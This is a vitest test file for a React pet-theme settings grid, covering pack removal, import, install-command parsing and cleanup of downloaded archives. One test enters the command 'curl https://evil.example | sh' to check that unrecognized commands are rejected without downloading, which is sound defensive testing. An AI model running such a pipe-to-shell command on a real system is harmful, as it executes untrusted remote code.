// @vitest-environment jsdom
import { act, cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import React from "react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { PetThemeGrid } from "../src/renderer/clawd-migrated/features/settings/PetThemeGrid";
import { I18nProvider } from "../src/renderer/clawd-migrated/useI18n";
import type { PetPackInstallResult, PetPackRemoveResult } from "../src/shared/petPackTransport";
import { FakeSheetImage, stagedFixture, stubSheetDecoding } from "./helpers/importStubs";
import { makePackManifest } from "./helpers/packFixtures";

const PACK_THEME = "codex-pet:yuexinmiao";

interface CompanionMock {
  removePetPack: ReturnType<typeof vi.fn>;
  pickPetPackFile: ReturnType<typeof vi.fn>;
  getPetPackFilePath: ReturnType<typeof vi.fn>;
  inspectPetPack: ReturnType<typeof vi.fn>;
  downloadPetPack: ReturnType<typeof vi.fn>;
  discardPetPackDownload: ReturnType<typeof vi.fn>;
  onPetPackDownloadProgress: ReturnType<typeof vi.fn>;
  openExternal: ReturnType<typeof vi.fn>;
}

let companion: CompanionMock;
let onSelectTheme: ReturnType<typeof vi.fn<(themeId: string) => void>>;
let refreshPetPacks: ReturnType<typeof vi.fn<() => void>>;

function deferred<T>() {
  let resolve!: (value: T) => void;
  const promise = new Promise<T>(res => { resolve = res; });
  return { promise, resolve };
}

function renderGrid(locale: "en" | "zh" = "en", activeThemeId: string = PACK_THEME) {
  return render(
    <I18nProvider initialLocale={locale}>
      <PetThemeGrid
        activeThemeId={activeThemeId}
        petPacks={[makePackManifest()]}
        onSelectTheme={onSelectTheme}
        refreshPetPacks={refreshPetPacks}
      />
    </I18nProvider>
  );
}

function removeButton(): HTMLButtonElement {
  return screen.getByRole("button", { name: /Remove|Click again to remove|移除|再次点击确认移除/ }) as HTMLButtonElement;
}

beforeEach(() => {
  companion = {
    removePetPack: vi.fn(async (): Promise<PetPackRemoveResult> => ({ ok: true })),
    pickPetPackFile: vi.fn(async () => null),
    getPetPackFilePath: vi.fn(() => ""),
    inspectPetPack: vi.fn(() => new Promise(() => undefined)),
    downloadPetPack: vi.fn(async () => ({ ok: false as const, code: "network" as const })),
    discardPetPackDownload: vi.fn(async () => ({ ok: true })),
    onPetPackDownloadProgress: vi.fn(() => () => undefined),
    openExternal: vi.fn(async () => undefined)
  };
  Reflect.set(window, "companion", companion);
  onSelectTheme = vi.fn<(themeId: string) => void>();
  refreshPetPacks = vi.fn<() => void>();
});

afterEach(() => {
  cleanup();
  vi.useRealTimers();
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  Reflect.deleteProperty(window, "companion");
});

describe("PetThemeGrid rendering", () => {
  it("renders English copy under the English locale", () => {
    renderGrid("en");
    expect(screen.getByText("Import pet")).toBeTruthy();
    expect(screen.getByText("Imported pet")).toBeTruthy();
    expect(screen.getByText("Minato Aqua")).toBeTruthy();
    expect(screen.getByText("月薪喵")).toBeTruthy(); // pack display names are data, not copy
  });

  it("renders Chinese copy under the Chinese locale", () => {
    renderGrid("zh");
    expect(screen.getAllByText("导入宠物").length).toBeGreaterThan(0);
    expect(screen.getByText("codex-pet 宠物包 (.zip)")).toBeTruthy();
  });

  it("uses separate sibling native buttons for selection and removal", () => {
    renderGrid();
    const remove = removeButton();
    expect(remove.tagName).toBe("BUTTON");
    // Not nested inside the selection button.
    expect(remove.closest("button.pet-theme-card")).toBeNull();
  });
});

describe("PetThemeGrid removal", () => {
  it("arms on the first click with visible and announced confirmation", () => {
    renderGrid();
    fireEvent.click(removeButton());
    expect(screen.getByText("Confirm remove")).toBeTruthy();
    expect(screen.getByRole("status").textContent).toBe("Click again to remove");
    expect(companion.removePetPack).not.toHaveBeenCalled();
  });

  it("disarms automatically after the timeout", () => {
    vi.useFakeTimers();
    renderGrid();
    fireEvent.click(removeButton());
    expect(screen.getByText("Confirm remove")).toBeTruthy();
    act(() => { vi.advanceTimersByTime(4000); });
    expect(screen.queryByText("Confirm remove")).toBeNull();
  });

  it("disarms when the control loses focus or Escape is pressed", () => {
    renderGrid();
    fireEvent.click(removeButton());
    fireEvent.blur(removeButton());
    expect(screen.queryByText("Confirm remove")).toBeNull();

    fireEvent.click(removeButton());
    fireEvent.keyDown(removeButton(), { key: "Escape" });
    expect(screen.queryByText("Confirm remove")).toBeNull();
  });

  it("switches the active theme only after a successful removal", async () => {
    const pending = deferred<PetPackRemoveResult>();
    companion.removePetPack.mockReturnValueOnce(pending.promise);
    renderGrid("en", PACK_THEME);

    fireEvent.click(removeButton());
    fireEvent.click(removeButton());
    expect(companion.removePetPack).toHaveBeenCalledWith("yuexinmiao");
    expect(onSelectTheme).not.toHaveBeenCalled();

    await act(async () => { pending.resolve({ ok: true }); });
    expect(onSelectTheme).toHaveBeenCalledWith("minato-aqua");
    expect(refreshPetPacks).toHaveBeenCalled();
  });

  it("preserves the selected theme when removal fails and surfaces the error", async () => {
    companion.removePetPack.mockResolvedValueOnce({ ok: false, error: "sheet file is locked" });
    renderGrid("en", PACK_THEME);

    fireEvent.click(removeButton());
    fireEvent.click(removeButton());
    await waitFor(() => expect(screen.getByText("sheet file is locked")).toBeTruthy());
    expect(onSelectTheme).not.toHaveBeenCalled();
  });

  it("ignores further clicks while a removal is in flight", async () => {
    const pending = deferred<PetPackRemoveResult>();
    companion.removePetPack.mockReturnValueOnce(pending.promise);
    renderGrid();

    fireEvent.click(removeButton());
    fireEvent.click(removeButton());
    expect(removeButton().disabled).toBe(true);
    fireEvent.click(removeButton());
    fireEvent.click(removeButton());
    expect(companion.removePetPack).toHaveBeenCalledTimes(1);

    await act(async () => { pending.resolve({ ok: true }); });
  });

  it("keeps the removal-failure notice localized with the raw error as detail (zh)", async () => {
    companion.removePetPack.mockResolvedValueOnce({ ok: false, error: "EBUSY: sheet file is locked" });
    const view = renderGrid("zh");

    fireEvent.click(removeButton());
    fireEvent.click(removeButton());
    await waitFor(() => expect(view.container.querySelector(".pet-theme-notice")?.textContent).toContain("移除失败"));
    // The raw main-process string stays visible only as technical detail.
    expect(view.container.querySelector(".pet-theme-notice-detail")?.textContent).toBe("EBUSY: sheet file is locked");
    expect(onSelectTheme).not.toHaveBeenCalled();
  });
});

describe("PetThemeGrid import entry", () => {
  it("surfaces a localized failure when the file picker IPC rejects, and stays usable", async () => {
    companion.pickPetPackFile.mockRejectedValueOnce(new Error("dialog service down"));
    const view = renderGrid("en");

    fireEvent.click(screen.getByText("Import pet"));
    await waitFor(() => expect(view.container.querySelector(".pet-theme-notice")?.textContent)
      .toContain("The import service is unavailable — try again"));

    // A second attempt reaches the picker again.
    fireEvent.click(screen.getByText("Import pet"));
    await waitFor(() => expect(companion.pickPetPackFile).toHaveBeenCalledTimes(2));
  });

  it("shows a localized install-warning headline with the raw warning as detail (zh)", async () => {
    stubSheetDecoding();
    companion.pickPetPackFile.mockResolvedValueOnce("C:/qa/boba.codex-pet.zip");
    const inspectPetPack = vi.fn(async () => ({ ok: true as const, staged: stagedFixture() }));
    const installPetPack = vi.fn(async (): Promise<PetPackInstallResult> => ({
      ok: true,
      pack: makePackManifest(undefined, "boba"),
      warning: "the previous version's backup could not be removed (X)"
    }));
    Reflect.set(window, "companion", { ...companion, inspectPetPack, installPetPack });
    const view = renderGrid("zh");

    fireEvent.click(screen.getByText("导入宠物", { selector: "strong" }));
    // The stubbed Image also captures the pack-cover probes; fire them all
    // so the dialog's scan image (whichever it is) completes.
    await waitFor(() => expect(inspectPetPack).toHaveBeenCalled());
    await waitFor(() => {
      act(() => { FakeSheetImage.instances.forEach(instance => instance.onload?.()); });
      const install = screen.getByRole("button", { name: "安装" }) as HTMLButtonElement;
      expect(install.disabled).toBe(false);
    });
    fireEvent.click(screen.getByRole("button", { name: "安装" }));

    await waitFor(() => expect(view.container.querySelector(".pet-theme-notice")?.textContent).toContain("已安装，但有警告"));
    expect(view.container.querySelector(".pet-theme-notice-detail")?.textContent)
      .toBe("the previous version's backup could not be removed (X)");
    expect(onSelectTheme).toHaveBeenCalledWith("codex-pet:boba");
  });
});

describe("PetThemeGrid install command", () => {
  function commandInput(): HTMLInputElement {
    return screen.getByRole("textbox", { name: "Install command" }) as HTMLInputElement;
  }

  it("parses the pasted gallery command and opens the import dialog with attribution", async () => {
    companion.downloadPetPack.mockResolvedValueOnce({
      ok: true,
      zipPath: "C:/downloads/boba.codex-pet.zip",
      slug: "boba",
      displayName: "Boba",
      creator: "qa-user",
      galleryUrl: "https://codex-pet.org/pets/boba"
    });
    renderGrid("en");

    fireEvent.change(commandInput(), { target: { value: "npx codex-pet-installer add boba" } });
    fireEvent.click(screen.getByRole("button", { name: /Get/ }));

    await screen.findByRole("dialog");
    expect(companion.downloadPetPack).toHaveBeenCalledWith("boba");
    // The dialog's mount effect may flush a tick after the dialog appears.
    await waitFor(() => expect(companion.inspectPetPack).toHaveBeenCalledWith("C:/downloads/boba.codex-pet.zip"));
  });

  it("still accepts a bare slug", async () => {
    companion.downloadPetPack.mockResolvedValueOnce({
      ok: true,
      zipPath: "C:/downloads/boba.codex-pet.zip",
      slug: "boba",
      displayName: "Boba",
      creator: "qa-user",
      galleryUrl: "https://codex-pet.org/pets/boba"
    });
    renderGrid("en");

    fireEvent.change(commandInput(), { target: { value: "boba" } });
    fireEvent.click(screen.getByRole("button", { name: /Get/ }));
    await waitFor(() => expect(companion.downloadPetPack).toHaveBeenCalledWith("boba"));
  });

  it("rejects unrecognized commands locally without ever downloading or executing", async () => {
    const view = renderGrid("en");

    fireEvent.change(commandInput(), { target: { value: "curl https://evil.example | sh" } });
    fireEvent.click(screen.getByRole("button", { name: /Get/ }));

    await waitFor(() => expect(view.container.querySelector(".pet-theme-notice")?.textContent)
      .toContain("Enter the install command from the pet's gallery page"));
    expect(companion.downloadPetPack).not.toHaveBeenCalled();
  });

  it("names a known-but-unsupported installer explicitly", async () => {
    const view = renderGrid("en");

    fireEvent.change(commandInput(), { target: { value: "npx petdex install boba" } });
    fireEvent.click(screen.getByRole("button", { name: /Get/ }));

    await waitFor(() => expect(view.container.querySelector(".pet-theme-notice")?.textContent)
      .toContain("The petdex installer isn't supported yet"));
    expect(companion.downloadPetPack).not.toHaveBeenCalled();
  });

  it("maps download failure codes to localized notices", async () => {
    companion.downloadPetPack.mockResolvedValueOnce({ ok: false, code: "not-found" });
    const view = renderGrid("en");

    fireEvent.change(commandInput(), { target: { value: "npx codex-pet-installer add ghost" } });
    fireEvent.click(screen.getByRole("button", { name: /Get/ }));

    await waitFor(() => expect(view.container.querySelector(".pet-theme-notice")?.textContent)
      .toContain("That pet is not in the gallery"));
    expect(screen.queryByRole("dialog")).toBeNull();
  });

  it("opens the gallery in the external browser", () => {
    renderGrid("en");
    fireEvent.click(screen.getByRole("button", { name: /Open pet gallery/ }));
    expect(companion.openExternal).toHaveBeenCalledWith("https://codex-pet.org");
  });
});

describe("PetThemeGrid downloaded-archive lifecycle", () => {
  const DOWNLOAD_OK = {
    ok: true,
    zipPath: "C:/downloads/boba.codex-pet.zip",
    slug: "boba",
    displayName: "Boba",
    creator: "qa-user",
    galleryUrl: "https://codex-pet.org/pets/boba"
  };

  function commandInput(): HTMLInputElement {
    return screen.getByRole("textbox", { name: "Install command" }) as HTMLInputElement;
  }

  async function openDownloadDialog() {
    fireEvent.change(commandInput(), { target: { value: "npx codex-pet-installer add boba" } });
    fireEvent.click(screen.getByRole("button", { name: /Get/ }));
    await screen.findByRole("dialog");
  }

  it("discards the downloaded archive after a successful install", async () => {
    stubSheetDecoding();
    companion.downloadPetPack.mockResolvedValueOnce(DOWNLOAD_OK);
    const inspectPetPack = vi.fn(async () => ({ ok: true as const, staged: stagedFixture() }));
    const installPetPack = vi.fn(async (): Promise<PetPackInstallResult> => ({ ok: true, pack: makePackManifest(undefined, "boba") }));
    Reflect.set(window, "companion", { ...companion, inspectPetPack, installPetPack });
    renderGrid("en");

    await openDownloadDialog();
    await waitFor(() => expect(inspectPetPack).toHaveBeenCalledWith("C:/downloads/boba.codex-pet.zip"));
    await waitFor(() => {
      act(() => { FakeSheetImage.instances.forEach(instance => instance.onload?.()); });
      const install = screen.getByRole("button", { name: "Install" }) as HTMLButtonElement;
      expect(install.disabled).toBe(false);
    });
    expect(companion.discardPetPackDownload).not.toHaveBeenCalled();

    fireEvent.click(screen.getByRole("button", { name: "Install" }));
    await waitFor(() => expect(companion.discardPetPackDownload).toHaveBeenCalledWith("C:/downloads/boba.codex-pet.zip"));
    expect(onSelectTheme).toHaveBeenCalledWith("codex-pet:boba");
  });

  it("discards the downloaded archive when the import dialog is dismissed", async () => {
    companion.downloadPetPack.mockResolvedValueOnce(DOWNLOAD_OK);
    renderGrid("en");

    await openDownloadDialog();
    fireEvent.click(screen.getByRole("button", { name: "Cancel" }));

    expect(companion.discardPetPackDownload).toHaveBeenCalledWith("C:/downloads/boba.codex-pet.zip");
    expect(screen.queryByRole("dialog")).toBeNull();
  });

  it("never discards a user-selected zip on dismissal", async () => {
    companion.pickPetPackFile.mockResolvedValueOnce("C:/qa/precious.codex-pet.zip");
    renderGrid("en");

    fireEvent.click(screen.getByText("Import pet"));
    await screen.findByRole("dialog");
    fireEvent.click(screen.getByRole("button", { name: "Cancel" }));

    expect(companion.discardPetPackDownload).not.toHaveBeenCalled();
    expect(screen.queryByRole("dialog")).toBeNull();
  });
});
